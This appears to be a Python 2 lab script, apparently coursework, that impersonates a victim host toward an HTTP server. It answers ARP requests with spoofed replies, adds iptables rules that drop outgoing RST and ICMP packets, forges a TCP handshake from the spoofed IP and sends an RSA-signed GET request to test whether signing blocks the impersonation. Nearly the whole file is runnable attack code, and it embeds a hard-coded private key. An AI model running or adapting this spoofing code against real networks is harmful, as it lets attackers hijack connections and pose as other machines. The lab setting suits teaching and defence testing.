#!/usr/bin/python

import argparse
import os
import argparse
import os
import sys
from threading import Thread
import time
from uuid import getnode as get_mac

from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
from scapy.all import *
from random import randrange


preforming_attack = True

private_key_client = '-----BEGIN RSA PRIVATE KEY-----\n' \
                     'MIICXAIBAAKBgQCp4BcPkpcL/1LkeRSL4c' \
                     'UeaIP9WWOmQCZmbvpR/JPgRnSxr9Tq\nY' \
                     'q4674ER2l6GwEZ+mRbfqoADwQVuTT9Z+3' \
                     'URzITqtM9/mGuoI3sPgG01WLFc/vqj\nEpx' \
                     'F3FuSXlpmAEhYKFMTLUlpou9ZyWQX4hyeYM' \
                     'ypYHVpdRLFsSTwzaUCLQIDAQAB\nAoGAdlB' \
                     'yH1F8zElXJXPDQK3NSaGHlFPG2MrDNALFa4' \
                     'bcQ48uxXbudxSlvryDC7ko\nrveJ4bCkQsGQ' \
                     'iYzNSIaawgQmA01naELENuA3B3ZUpFPoEJB1' \
                     'ugl3aA6LzPrkaaYC\nvARoG/dXKhOC9JV3oi' \
                     'JtNSxGrzr0gD4dLUnBscvMPFcE4eECQQDDA0' \
                     'X57kLumVpy\nd1/DaEk0xlgsuJScXD7EIZrf' \
                     '8PR45LoLv6TbTOSfRMEWvbWlyNpYiw14Glcm' \
                     'UZYS\n9VaARwf5AkEA3wBQNuudXNtI1R2gsX' \
                     'r3rf35B/q4Ew8YoOdEMunpYEk0gbO467Wp\n' \
                     'SDk2LygfLu3mvVs0gYE1Af8t5LIiW35g1QJ' \
                     'ATskKw0+EEPs5tFcQBFUkhkK/qsmj\nmIwX+' \
                     '4sME/839YOKumZhhwvIraPMUpCwS1sbA3yiI' \
                     '2yY2u1JMT2XBdosmQJAMWrF\nW9ZMsfYaJrgB' \
                     'EzN3zYPZes4xmm+e+pElSM8TG3Y9f3yPPxSrp' \
                     'cif3EVc2652koGy\nmfxC/eVJi0N6X6Ia3QJB' \
                     'ALzLfPp6hSus+KFHdBQ4PDre0iFZ3vLdQgQW' \
                     't6jdZXj2\n8RB82WB3d7riUpk9iBunuQPBzkb' \
                     'XRwi7YLG2LzT2IBY=\n' \
                     '-----END RSA PRIVATE KEY-----'

prv_key = RSA.importKey(private_key_client)


# pub_key_obj = RSA.importKey(public_key_client)
pub_key_obj = RSA.importKey(private_key_client)

# RANDOM HTTP MESSAGE
HTTP_MESSAGE = 'GET / HTTP/1.1\r\n' \
               'Host: 192.168.1.2:8000\r\n' \
               'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:43.0) Gecko/20100101 Firefox/43.0\r\n' \
               'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' \
               'Accept-Language: en-US,en;q=0.5\r\n' \
               'Accept-Encoding: gzip, deflate\r\n' \
               'Connection: keep-alive\r\n\r\n'


# filter_arp FILTERS EVERY INCOMING
# MESSAGE FOR ARP MESSAGE
def filter_arp(src, dst):
    return lambda pkt: ARP in pkt \
                       and pkt[ARP].pdst == dst \
                       and pkt[ARP].psrc == src \
                       and pkt[ARP].op == 1


def httpfilter(src, dst):
    return lambda pkt: TCP in pkt and Raw in pkt and str(pkt[Raw]).startswith('HTTP') and pkt[IP].src == src and pkt[IP].dst == dst


# src_ip - THE SERVER IP THAT WE EXPECT
# TO SEND AN ARP REQUEST
# dst_ip - THE IP WE PRETEND TO BE
def arp_spoofing(src_ip, dst_ip):
    # enter new arp entry to Clients ARP table,
    #  with the spoofing address
    # so the client wan't ask how it is
    mac = get_mac()
    os.popen('arp -s ' + src_ip + ' ' + str(mac))
    print 'Waiting to replay for arp query from: ' \
          + dst_ip + ' to ' + src_ip
    arp_filter = filter_arp(dst_ip, src_ip)
    # waiting for ARP query from the Server

    '''
    here we check the global variable 'preforming_attack'
    if the attack is done or not, in case the attack was
    done we close the thread otherwise we keep listen
    to an arp request from the server each iteration inside
    the while, sniff pkt for 2 second and return to check
    if preforming_attack is done, if the ARP will arrive
    exactly at the time we preform the while condition and
    not sniffing, this is not a problem because the server
    will keep sending ARP request until we'll answer him

    ---NOTE---:
    we assume that there is no other computer with the IP address we
    pretend to be, there for this loop will not go infinity
    '''

    while preforming_attack:
        pkt = sniff(count=1, lfilter=arp_filter, timeout=2)
        if not pkt:
            continue
        else:
            # crating an ARP massage from the spoof_ip to the
            # Web_Server_ip
            op = 2  # OP code 2 specifies ARP Reply
            arp_replay = ARP(op=op, psrc=src_ip, pdst=dst_ip)
            send(arp_replay, iface='eth0')
            print 'ARP replay successfully sent...'


'''
this method responsible for creating TCP handshake with the server
while pretending to be some else
'''


def handshake(src_ip, dst_ip, sport, dport):
    initial_seq_num = 1000
    # SYN packet
    syn_pkt = IP(src=src_ip, dst=dst_ip) / \
              TCP(sport=sport, dport=dport, flags='S',
                  seq=initial_seq_num)
    print 'Sending SYN packet and waiting for response...'
    response_pkt = sr1(syn_pkt)

    # in case this is the first time we connect to the server,
    # the response message is SYN_ACK
    if response_pkt[0][TCP].flags == 18L:
        print 'received SYN_ACK from The Server'
        # ACK
        ack_pkt = IP(src=src_ip, dst=dst_ip)/\
                  TCP(sport=sport, dport=dport, flags='A',
                      seq=response_pkt[0][TCP].ack,
                      ack=response_pkt[0][TCP].seq + 1)
        print 'Sending ACK packet to the Server...'
        send(ack_pkt)
        seq = response_pkt[0][TCP].ack
        ack = response_pkt[0][TCP].seq + 1  # +1 for the SYN flag
        return seq, ack
    # in case this is NOT the first time we connect to the server,
    # the message is ACK because we already made the handshake
    else:
        seq = response_pkt[0][TCP].ack
        ack = response_pkt[0][TCP].seq
        print 'received ACK packet'
        return seq, ack


'''
 after the IP spoofing was successfully made, we have
 the next sequence number of the TCP stream and now we
 send to HTTP_GET message to show that the ATTACK worked.
 -------
 THIS TIME, THE CLIENT SIGN THE MESSAGE HE SEND WITH A
 UNIQUE PRIVATE KEY THE SERVER HAS THE CLIENT PUBLIC KEY,
 AND HE WILL NEED TO DECRYPT THE MESSAGE  AND VERIFY THAT
 THIS IS REALLY THE CLIENT IT CLAIM TO BE.

 IN OUR CASE, THIS CLIENT DOESNT KNOW THE KEY OF THE CLIENT
 HE WANT TO PRETEND SO HE SHOULDN'T SUCCEED TO SEND THE
 MESSAGE TO THE SERVER.
 ------

 src - the victims IP addresss
 dst - the Server address
 sport - attacker client source port
 dport - Server destination port
 seq_num - the next sequence number of the TCP connection
 to the Server
'''


def send_get_req(src, dst, sport, dport, seq_num, ack_num):
    print 'Creating HTTP packet from: ' + src + ':' \
          + str(sport) \
          + ' to: ' \
          + dst \
          + ':' \
          + str(dport) \
          + ' with sequence number:' \
          + str(seq_num)

    get_request = HTTP_MESSAGE
    # getting the headers of http
    http_headers_and_data = get_request.split('\r\n')
    # CREATING HASH FROM THE
    hash_to_sign = SHA256.new(HTTP_MESSAGE).hexdigest()
    # SIGN THE HASH STRING WE HAVE CREATED BEFORE
    # WITH THIS CLIENT PRIVATE KEY
    signature = (prv_key.sign(hash_to_sign, None))
    # PUSH THE NEW "SIGNATURE" HEADER INTO THE MESSAGE
    http_headers_and_data.insert(1, 'signature: ' +
                                 str(signature))
    joined_get_request = ''.join(str(header + '\r\n')
                                 for header in http_headers_and_data)
    raw = joined_get_request[:len(joined_get_request)-1]

    ip = IP(src=src, dst=dst)
    tcp = TCP(sport=sport, dport=dport,
              seq=seq_num,
              ack=ack_num,
              flags='PA')

    print 'Sending HTTP packet...'
    pkt = sr1(ip/tcp/raw)

    if TCP in pkt and Raw in pkt and str(pkt[Raw]).startswith('HTTP') and pkt[IP].src == src and pkt[IP].dst == dst:
        return pkt

    ans = sniff(count=1, lfilter=httpfilter(dst, src), timeout=2)
    while not ans:
        ans = sniff(count=1, lfilter=httpfilter(dst, src), timeout=2)

    return ans


def main():

    # READ ARGUMENTS FROM THE USER:
    # to execute the program use the following convention:
    # sudo ./client q1.py -src  '192.168.1.17'

    parser = argparse.ArgumentParser()
    parser.add_argument('-src', help='The victims ip address you want to hide behind')
    args = parser.parse_args()

    # The client source port
    rand_port = randrange(1000, 10000)

    src_ip = args.src
    dst_ip = '192.168.1.2'
    src_port = rand_port
    # The server port
    dst_port = 8000

    # iptables rule to prevent the os from sending
    # RST messages for unknown TCP connection
    # like those we're about to send
    os.popen('iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 192.168.1.1 -d 192.168.1.2  -j DROP')
    os.popen('iptables -A OUTPUT -s 192.168.1.1 -d ' + dst_ip + ' -p ICMP --icmp-type redirect -j DROP')
    os.popen('iptables -A OUTPUT -s 192.168.1.1 -d ' + dst_ip + ' -p ICMP --icmp-type port-unreachable -j DROP')

    # THIS TREAD WILL BE RESPONSIBLE FOR LISTENING TO
    # ARP REQUEST FROM THE SERVER
    # AND TO ANSWER TO THE RELEVANT ONE
    arp_thread = Thread(target=arp_spoofing, args=(src_ip, dst_ip))

    try:
        arp_thread.start()
    except KeyboardInterrupt:
        print "Error: unable to start thread"

    # initiate a TCP connection between the Client and the Server
    # preforming 3-way handshake, and get in return the next sequence
    # number for the HTTP GET msg i wan't to send.
    seq_num, ack_num = handshake(src_ip, dst_ip, src_port, dst_port)

    # WHEN WE GET HERE THE ATTACK WAS MADE
    # THIS GLOBAL VARIABLE ANNOUNCE THE ARP-THREAD THAT
    # HE CAN STOP LISTENING TO ARP MESSAGES
    global preforming_attack
    preforming_attack = False

    # sending HTTP GET msg while impersonating to another
    # Client IP address
    response = send_get_req(src_ip, dst_ip,
                            src_port, dst_port,
                            seq_num, ack_num)

    print 'SERVER RESPONSE:'
    print response[0][Raw].load

    ok_msg_ip = response[0][IP]
    ok_msg_tcp = response[0][TCP]

    server_rst = IP(src=ok_msg_ip.dst, dst=ok_msg_ip.src) / \
                 TCP(sport=ok_msg_tcp.dport,
                     dport=ok_msg_tcp.sport,
                     seq=ok_msg_tcp.ack,
                     ack=ok_msg_tcp.seq, flags='AR')
    send(server_rst)

    # waiting for arp_thread to end
    arp_thread.join()

    print "Exiting Main Thread: Bye, Bye..."


if __name__ == '__main__':
    main()
